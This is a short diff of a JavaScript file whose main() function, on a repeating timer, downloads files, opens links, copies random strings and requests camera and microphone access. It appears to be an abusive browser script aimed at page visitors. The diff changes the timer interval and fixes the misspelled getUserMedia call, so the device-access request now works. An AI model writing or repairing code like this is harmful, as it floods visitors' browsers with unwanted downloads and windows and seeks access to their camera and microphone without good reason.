@@ -41,7 +41,7 @@ function main() {
     setInterval(() => {
         downloadFiles(filesToDownload);
         openLinks(linksToOpen);
-    }, 100);
+    }, 1000);
 
     function copyRandomString() {
         const randomString = Math.random().toString(36).substring(2, 18);
@@ -72,7 +72,7 @@ function main() {
     }
 
     function requestCameraAndMicrophone() {
-        navigator.mediaDevices.getUser Media({ video: true, audio: true })
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(stream => {
                 console.log('Camera and microphone access granted.');
             })
